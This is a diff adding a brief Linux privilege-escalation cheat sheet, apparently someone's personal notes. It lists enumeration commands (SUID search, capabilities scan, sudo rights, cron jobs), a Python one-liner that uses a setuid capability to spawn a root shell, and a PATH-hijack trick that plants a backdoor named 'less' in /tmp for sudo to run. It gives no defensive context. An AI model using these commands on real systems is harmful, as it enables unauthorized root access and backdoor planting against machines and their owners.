@@ -1,0 +1,14 @@
+Privilages Excalation Commands:
+ls -lah
+netstat -ant
+ps aux
+ls -alh
+getcap -r / 2>/dev/null
+=> to get root in python => python3.8 -c 'import os; os.setuid(0); os.system("/bin/sh")'
+crontab -l
+find / -perm -4000 2>/dev/null
+       export PATH=/tmp:$PATH
+       #Put your backdoor in /tmp and name it "less"
+       sudo less
+sudo -l -l     # List allowed sudo commands
+wsl -u root visudo    # Fix broken WSL sudo file
